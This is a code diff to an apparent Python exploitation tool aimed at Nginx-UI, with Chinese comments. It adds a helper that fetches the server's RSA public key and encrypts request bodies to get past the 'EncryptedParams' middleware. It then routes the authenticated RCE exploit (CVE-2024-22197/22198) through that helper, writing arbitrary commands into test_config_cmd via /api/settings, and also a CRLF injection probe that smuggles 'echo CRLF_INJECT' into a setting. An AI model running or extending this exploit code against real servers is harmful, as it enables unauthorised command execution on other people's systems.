@@ -314,6 +314,72 @@ def check_cve_2024_23827_file_write(url: str, s: requests.Session) -> Tuple[bool
     return False, ''
 
 
+# ===================== 加密 POST 工具 =====================
+
+def _encrypted_post(url: str, s: requests.Session, path: str, payload: dict,
+                    timeout: int = 10, debug: bool = False) -> requests.Response:
+    """通过 EncryptedParams 中间件发送加密 POST 请求
+
+    Nginx-UI 的写操作 (settings/certs 等) 都需要 RSA 加密传输
+    先获取公钥 → PKCS1v15 加密 JSON → 包在 encrypted_params 中发送
+    """
+    import json as _json, base64, time as _time
+
+    # 先尝试明文 (某些接口或老版本不需要加密)
+    r = s.post(build_url(url, path), json=payload, timeout=timeout)
+    if r.status_code not in (400, 403):
+        return r
+    # 400/403 可能是加密中间件拒绝了明文
+    resp_data = {}
+    try:
+        resp_data = r.json()
+    except Exception:
+        pass
+    if resp_data.get('code') != 40001 and resp_data.get('scope') != 'middleware' and r.status_code != 403:
+        return r
+
+    if debug:
+        safe_print(f"    {C.CYN}[*] 明文被拒, 尝试加密 POST...{C.RST}")
+
+    # 获取公钥
+    try:
+        r_crypto = s.post(build_url(url, '/api/crypto/public_key'), json={
+            'timestamp': int(_time.time() * 1000),
+            'fingerprint': 'Mozilla/5.0',
+        }, timeout=5)
+        if r_crypto.status_code != 200:
+            return r  # 无法获取公钥, 返回原始明文响应
+
+        crypto_data = r_crypto.json()
+        public_key_pem = (crypto_data.get('public_key', '') or
+                          crypto_data.get('data', {}).get('public_key', '') or
+                          crypto_data.get('key', ''))
+        if not public_key_pem:
+            return r
+
+        from cryptography.hazmat.primitives import serialization
+        from cryptography.hazmat.primitives.asymmetric import padding
+
+        pubkey = serialization.load_pem_public_key(public_key_pem.encode())
+        payload_json = _json.dumps(payload)
+        encrypted = pubkey.encrypt(payload_json.encode(), padding.PKCS1v15())
+        enc_b64 = base64.b64encode(encrypted).decode()
+
+        r2 = s.post(build_url(url, path),
+                    json={'encrypted_params': enc_b64}, timeout=timeout)
+        if debug:
+            safe_print(f"    加密 POST → [{r2.status_code}] {r2.text[:200]}")
+        return r2
+    except ImportError:
+        if debug:
+            safe_print(f"    {C.CYN}cryptography 未安装, 无法加密{C.RST}")
+    except Exception as e:
+        if debug:
+            safe_print(f"    {C.CYN}加密 POST 异常: {e}{C.RST}")
+
+    return r  # 回退返回原始明文响应
+
+
 # ===================== 2. CVE-2024-22197/22198 — 认证 RCE =====================
 
 def check_authenticated_rce(url: str, s: requests.Session, username: str,
@@ -359,9 +425,7 @@ def check_authenticated_rce(url: str, s: requests.Session, username: str,
 
     for key, cmd in markers.items():
         try:
-            r = s.post(build_url(url, '/api/settings'), json={
-                key: cmd,
-            }, timeout=10)
+            r = _encrypted_post(url, s, '/api/settings', {key: cmd}, timeout=15, debug=True)
             safe_print(f"  {C.CYN}[*] 尝试修改 {key} → HTTP {r.status_code}{C.RST}")
             if r.status_code == 200:
                 safe_print(f"  {C.RED}[!] 成功修改 {key}!{C.RST}")
@@ -385,7 +449,7 @@ def check_cve_2024_23828_crlf(url: str, s: requests.Session) -> bool:
 
     # CRLF 注入检测: 尝试在 settings 值中注入换行
     try:
-        r = s.post(build_url(url, '/api/settings'), json={
+        r = _encrypted_post(url, s, '/api/settings', {
             'test_config_cmd': 'nginx -t\r\necho CRLF_INJECT',
         }, timeout=10)
         safe_print(f"  {C.CYN}[*] CRLF 注入检测 → HTTP {r.status_code}{C.RST}")
@@ -550,11 +614,11 @@ def exploit_authenticated_rce(url: str, s: requests.Session, command: str) -> Op
     """利用 CVE-2024-22197/22198 认证 RCE"""
     safe_print(f"\n{C.BLD}[CVE-2024-22197] 认证 RCE: {command}{C.RST}\n")
 
-    # 修改 test_config_cmd
+    # 修改 test_config_cmd (走加密 POST)
     try:
-        r = s.post(build_url(url, '/api/settings'), json={
+        r = _encrypted_post(url, s, '/api/settings', {
             'test_config_cmd': command,
-        }, timeout=10)
+        }, timeout=15, debug=True)
         safe_print(f"  {C.CYN}[*] 修改 test_config_cmd → HTTP {r.status_code}{C.RST}")
 
         if r.status_code == 200:
